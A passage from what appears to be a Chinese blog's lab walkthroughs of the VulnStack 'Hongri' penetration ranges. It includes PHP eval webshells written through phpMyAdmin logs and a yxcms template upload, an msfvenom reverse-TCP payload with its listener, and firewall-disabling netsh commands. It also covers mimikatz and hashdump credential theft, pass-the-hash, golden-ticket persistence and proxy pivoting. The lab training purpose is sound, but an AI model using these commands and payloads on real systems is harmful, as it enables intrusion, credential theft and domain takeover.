src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230907171010536.png" alt="image-20230907171010536" style="zoom:80%;"><p>拿到shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig /all</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908085508000.png" alt="image-20230908085508000" style="zoom:80%;"><p>可以看到所在域为<strong>de1ay.com</strong>，DNS信息为<strong>10.10.10.10</strong>，可能是域控</p><p>尝试关闭防火墙，但是提示权限不够</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall show all state    //查看防火墙状态</span><br><span class="line">shell netsh advfirewall set allprofile state off  //关闭防火墙</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908085923609.png" class title="image-20230908085923609"><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell systeminfo</span><br></pre></td></tr></table></figure><p>查看补丁情况发现有三个补丁，那么可以提权的exp有很多</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230907172103426.png" alt="image-20230907172103426" style="zoom:67%;"><p>将<strong>systeminfo</strong>消息直接复制到在线网站，搜索可以利用的漏洞和poc  <a href="https://i.hacking8.com/tiquan">提权辅助网页 Windows提权辅助 (hacking8.com)</a></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230907173241392.png" alt="image-20230907173241392" style="zoom:67%;"><p>这里用到<code>MS14-058</code>漏洞提权，需要在<strong>cs</strong>中下载插件<a href="https://github.com/rsmudge/ElevateKit">elevate.cna</a></p><p><a href="https://mp.weixin.qq.com/s/CEI1XYkq2PZmYsP0DRU7jg">使用Aggressor脚本雕饰Cobalt Strike</a></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908104400744.png" alt="image-20230908104400744" style="zoom:80%;"><p>成功提权到<strong>system</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908104755433.png" alt="image-20230908104755433" style="zoom:80%;"><p>接下来就可以<strong>run mimikatz</strong>去抓密码了</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908110054746.png" alt="image-20230908110054746" style="zoom:80%;"><p><strong>arp</strong>查看存活机器</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908111836717.png" alt="image-20230908111836717" style="zoom:80%;"><p>关闭防火墙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall show all state    //查看防火墙状态</span><br><span class="line">shell netsh advfirewall set allprofile state off  //关闭防火墙</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908112504431.png" alt="image-20230908112504431" style="zoom:80%;"><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>找到目标<strong>10.10.10.10</strong>进行传哈希攻击</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908122904108.png" alt="image-20230908122904108" style="zoom:67%;"><p>DC上线</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908123023349.png" alt="image-20230908123023349" style="zoom:67%;"><h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><p>这里使用到金票进行权限维持</p><p>首先<code>hashdump</code>出krbtgt的hash值</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908123226137.png" alt="image-20230908123226137" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpassword</span><br></pre></td></tr></table></figure><p>查一下SID</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908123350883.png" alt="image-20230908123350883" style="zoom:80%;"><p>在web主机上生成金票</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908123732472.png" alt="image-20230908123732472" style="zoom:80%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\10.10.10.10\c$</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/image-20230908123827348.png" alt="image-20230908123827348" style="zoom:80%;"><p>可以dir C盘，拿到域控</p>]]></content>
      
      
      <categories>
          
          <category> 渗透打靶 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红日靶场一</title>
      <link href="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/"/>
      <url>/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/">VulnStack 官方链接</a></p><p>vmx文件，会自动打开Vmware，初始的密码都是：<strong>hongrisec@2019</strong>，登陆时有的机器会提示我密码过期，更改密码即可</p><p>网络拓扑图如下：</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5ouI6Iqx5YC-5Z-O,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="在这里插入图片描述" style="zoom: 80%;"><h4 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h4><p>拓扑图我们得知，win7是一个边界服务器，所以是需要有两个网卡的，首先给win7添加一个网卡</p><blockquote><p>编辑虚拟机–&gt;添加–&gt;网络适配器</p></blockquote><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801095557388.png" alt="image-20230801095557388" style="zoom:60%;"><blockquote><p>将网络适配器1设置成自定义Vmnet1(仅主机模式)，网络适配器2设置成NAT模式</p></blockquote><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801095828596.png" alt="image-20230801095828596" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801095847645.png" alt="image-20230801095847645" style="zoom:67%;"><h4 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h4><p>将网络适配器设置为VMnet1（仅主机模式）</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801100227904.png" alt="image-20230801100227904" style="zoom:67%;"><h4 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h4><p>将网络适配器设置为VMnet1（仅主机模式）</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801100402525.png" alt="image-20230801100402525" style="zoom:67%;"><p>至此网络配置完成，现在可以登进去每个服务器看一看，是不是成功获取了IP，最终形成的 IP 划分情况如下：</p><table><thead><tr><th>主机</th><th>IP地址</th></tr></thead><tbody><tr><td>物理机win11</td><td>192.168.95.1(VMnet8的IP)</td></tr><tr><td>win7边界服务器</td><td>外网IP：192.168.85.133；内网IP：192.168.52.143</td></tr><tr><td>win2003</td><td>内网IP：192.168.52.141</td></tr><tr><td>win2008</td><td>内网IP：192.168.52.138</td></tr></tbody></table><p>win11是可以访问外网的，win2003和win2008都不行</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801101637723.png" alt="image-20230801101637723" style="zoom:45%;"><p>在C盘中找到phpstudy，打开web服务</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801160958535.png" alt="image-20230801160958535" style="zoom:64%;"><h1 id="01-ATT-CK红队评估一"><a href="#01-ATT-CK红队评估一" class="headerlink" title="01 ATT&amp;CK红队评估一"></a>01 ATT&amp;CK红队评估一</h1><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><h4 id="探测靶机IP"><a href="#探测靶机IP" class="headerlink" title="探测靶机IP"></a>探测靶机IP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801112620149.png" alt="image-20230801112620149" style="zoom:60%;"><h4 id="探测开放端口"><a href="#探测开放端口" class="headerlink" title="探测开放端口"></a>探测开放端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -p- 192.168.85.133</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801161529692.png" alt="image-20230801161529692" style="zoom:60%;"><h4 id="web端信息搜集"><a href="#web端信息搜集" class="headerlink" title="web端信息搜集"></a>web端信息搜集</h4><p>看到开放了80端口和3306端口</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801161655821.png" alt="image-20230801161655821" style="zoom:67%;"><p>访问80端口，发现是一个phpstudy探针</p><p><strong>dirsearch</strong>扫一下目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.85.133 -e * -i 200</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801161938577.png" alt="image-20230801161938577" style="zoom:67%;"><p>扫出<code>/phpinfo.php</code>和<code>/phpmyAdmin/</code></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="phpmyadmin写🐎"><a href="#phpmyadmin写🐎" class="headerlink" title="phpmyadmin写🐎"></a><strong>phpmyadmin写🐎</strong></h5><p>进如<code>phpmyAdmin</code>，直接初始密码 <strong>root : root</strong> 登陆成功</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801162213460.png" class title="image-20230801162213460"><p>进入之后就想到写🐎，在之前的探针中我们又能看到绝对路径</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801172913746.png" alt="image-20230801172913746" style="zoom:67%;"><p>于是我们先查一下读写权限是否开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> &quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801172326904.png" alt="image-20230801172326904" style="zoom: 50%;"><p>发现为null，就是都没有读写权限，如果要修改只能进入服务器修改<code>MySQL.ini</code>，所以我们只能换一种方法</p><p>写🐎还可以写进日志、慢日志</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables  <span class="keyword">like</span>  <span class="string">&#x27;general_log&#x27;</span>;   #可以查看日志的读写是否开启</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;           #开启此功能</span><br><span class="line"><span class="keyword">show</span> variables  <span class="keyword">like</span>  <span class="string">&#x27;general_log_file&#x27;</span>;                           #查看日志的默认路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;</span>;         #修改路径</span><br></pre></td></tr></table></figure><p>查出来是off，只需要把他改为on就行了</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801172746085.png" alt="image-20230801172746085" style="zoom:60%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801172823331.png" alt="image-20230801172823331" style="zoom:60%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801173747494.png" alt="image-20230801173747494" style="zoom:58%;"><p>写🐎</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801173456615.png" alt="image-20230801173456615" style="zoom:60%;"><p>蚁剑连shell.php</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801174601462.png" class title="image-20230801174601462"><h5 id="yxcms文件上传"><a href="#yxcms文件上传" class="headerlink" title="yxcms文件上传"></a><strong>yxcms文件上传</strong></h5><p>这里发现一个<strong>yxcms</strong>和<strong>beifen.rar</strong>,，<strong>beifen.rar</strong>应该就是网站的备份文件，我们先下载下来</p><p>进入<strong>yxms</strong>看看</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801175743888.png" alt="image-20230801175743888" style="zoom:75%;"><p>发现后台登录密码，成功登入后台</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801175950385.png" alt="image-20230801175950385" style="zoom:58%;"><p>前台模板–&gt;管理模板文件–&gt;新建，便可上传文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801181617004.png" class title="image-20230801181617004"><p>在刚刚下载的备份文件中就能找到路径，用蚁剑就能连上</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801183002240.png" alt="image-20230801183002240" style="zoom:67%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801183127703.png" alt="image-20230801183127703" style="zoom:50%;"><h5 id="yxcms-xss"><a href="#yxcms-xss" class="headerlink" title="yxcms xss"></a><strong>yxcms xss</strong></h5><p>留言板中还有一个<strong>xss</strong>，在后台审核时触发</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801183755092.png" alt="image-20230801183755092" style="zoom:45%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230801183931382.png" alt="image-20230801183931382" style="zoom:33%;"><h3 id="三、后渗透"><a href="#三、后渗透" class="headerlink" title="三、后渗透"></a>三、后渗透</h3><p>后渗透阶段，当我们已经将小马上传到web服务器上时，可以用webshell管理工具进行下一步渗透了。</p><h4 id="1-msf上线"><a href="#1-msf上线" class="headerlink" title="1. msf上线"></a>1. msf上线</h4><p>这里的思路是将shell派送给CS或者msf进行下一步渗透。<br>使用msf生成exe并开启监听(也可以用cs生产exe)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.85.128 LPORT=1234 -f exe -o /home/bamboo/桌面/hack.exe</span><br></pre></td></tr></table></figure><p>先用kali生成hack.exe文件，放在桌面上方便我们一会儿用蚁剑传</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230809225517553.png" alt="image-20230809225517553" style="zoom:50%;"><p>将刚刚生成的**.exe**文件传上去</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230809225654725.png" alt="image-20230809225654725" style="zoom:50%;"><p>打开msf，开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfdb run</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">set lhost 192.168.85.128</span><br><span class="line">set lport 1234</span><br><span class="line">exploit -j(后台)允许</span><br></pre></td></tr></table></figure><p>在蚁剑中打开命令行，执行刚刚上传的<strong>hack.exe</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230809225809784.png" alt="image-20230809225809784" style="zoom:55%;"><p>收到<strong>shell</strong></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230809225947579.png" alt="image-20230809225947579" style="zoom:50%;"><p><strong>查看会话</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i</span><br></pre></td></tr></table></figure><h4 id="2-msf信息搜集"><a href="#2-msf信息搜集" class="headerlink" title="2.msf信息搜集"></a>2.msf信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.msf arp 发现主机</span><br><span class="line">run arp_scanner -r  192.168.85.0/24</span><br><span class="line">2.查看msf的提权</span><br><span class="line">run post/multi/recon/local_exploit_suggester      查看msf的提权</span><br></pre></td></tr></table></figure><h4 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h4><p><strong>获取system权限</strong></p><p>进来后第一步肯定是提权到system：<br>这里直接是administrator，所有可以直接提到system，实战中还需要其他手段提权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getuid查看服务器权限</span><br><span class="line">getsystem 提权</span><br><span class="line">getuid 查看是否提权成功</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812110538827.png" alt="image-20230812110538827" style="zoom:50%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812110558781.png" alt="image-20230812110558781" style="zoom:50%;"><h4 id="4-抓取域用户的密码信息"><a href="#4-抓取域用户的密码信息" class="headerlink" title="4.抓取域用户的密码信息"></a>4.抓取域用户的密码信息</h4><h5 id="1-导入账号、密码hash值"><a href="#1-导入账号、密码hash值" class="headerlink" title="1.导入账号、密码hash值"></a>1.导入账号、密码hash值</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run hashdump   这条命令报错，网上搜了一下换一个</span><br><span class="line">run windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/coderge/p/13752193.html">Metasploit之Hash攻击</a></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812115509703.png" alt="image-20230812115509703" style="zoom:50%;"><h5 id="2-mimikatz"><a href="#2-mimikatz" class="headerlink" title="2.mimikatz"></a>2.mimikatz</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">加载mimikatz模块</span><br><span class="line">Windows10/2012 以下的版本可以直接抓取明文密码</span><br><span class="line">再尝试加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，</span><br><span class="line">而且该进程也需要 是system权限运行的。 </span><br><span class="line">ps 查看进程</span><br><span class="line">migrate PID </span><br><span class="line">load mimikatz </span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line">如果还是不行就用下面这两个</span><br><span class="line">creds_tspkg</span><br><span class="line">kiwi_cmd -f sekurlsa::searchpasswords</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/X_sweelg/article/details/117480834">msf 使用mimikatz获取明文密码过程中获取密码失败</a></p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812122533053.png" alt="image-20230812122533053" style="zoom:50%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812122605873.png" alt="image-20230812122605873" style="zoom:50%;"><h5 id="3-kiwi"><a href="#3-kiwi" class="headerlink" title="3.kiwi"></a>3.kiwi</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load wiki</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><h4 id="5-3389连接"><a href="#5-3389连接" class="headerlink" title="5.3389连接"></a>5.3389连接</h4><p>开启3389:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812123202366.png" alt="image-20230812123202366" style="zoom:50%;"><p>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 3389 192.168.85.133</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812170836053.png" alt="image-20230812170836053" style="zoom:50%;"><h4 id="6-跨网段横向渗透"><a href="#6-跨网段横向渗透" class="headerlink" title="6.跨网段横向渗透"></a>6.跨网段横向渗透</h4><h5 id="6-1-msf-socks4a-proxychains-穿透内网"><a href="#6-1-msf-socks4a-proxychains-穿透内网" class="headerlink" title="6.1 msf socks4a proxychains 穿透内网"></a>6.1 msf socks4a proxychains 穿透内网</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">route add 192.168.52.0/24      添加路由</span><br><span class="line">route autorout -p                       查看是否添加成功 </span><br><span class="line">background                            返回</span><br><span class="line">route print                  输出路由</span><br><span class="line">use auxiliary/server/socks4a    使用 socks4a模块</span><br><span class="line">set srvport 1080              设置端口1080</span><br><span class="line">run                              运行</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run post/multi/manage/autoroute</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set VERSION 4a</span><br><span class="line">set SRVHOST 127.0.0.1</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812171730913.png" alt="image-20230812171730913" style="zoom:50%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812174111736.png" alt="image-20230812174111736" style="zoom:50%;"><p>配置proxychains：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812174553038.png" alt="image-20230812174553038" style="zoom:50%;"><h5 id="6-2测试是否成功"><a href="#6-2测试是否成功" class="headerlink" title="6.2测试是否成功"></a>6.2测试是否成功</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl 192.168.52.143</span><br><span class="line">访问成功 说明 代理添加成功</span><br><span class="line">proxychains nmap -sT -Pn 192.168.52.143</span><br></pre></td></tr></table></figure><p>之前打了一天都没成功，后面重新试终于成功了:sob:</p><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815112343253.png" alt="image-20230815112343253" style="zoom:50%;"><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815113019102.png" alt="image-20230815113019102" style="zoom:50%;"><h5 id="6-3内网信息搜集"><a href="#6-3内网信息搜集" class="headerlink" title="6.3内网信息搜集"></a>6.3内网信息搜集</h5><p>arp 探测内网存活主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line">set SESSION 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812231209986.png" alt="image-20230812231209986" style="zoom:50%;"><p>udp协议发现内网存活主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230812232257127.png" alt="image-20230812232257127" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">结合发现内网内共存在三台主机</span><br><span class="line"></span><br><span class="line">192.168.52.138/24</span><br><span class="line">192.168.52.141/24</span><br><span class="line">192.168.52.143/24</span><br><span class="line"></span><br><span class="line">查看域信息：net view</span><br><span class="line">查看主域信息：net view /domain</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开始横向渗透控制其它主机<br>进行其它内网主机端口探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -p 0-1000 -Pn -sT 192.168.52.141</span><br></pre></td></tr></table></figure><blockquote><p>有防火墙（-PN、-sT必须加）</p></blockquote><img src="/2024/01/23/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20230815171151869.png" alt="image-20230815171151869" 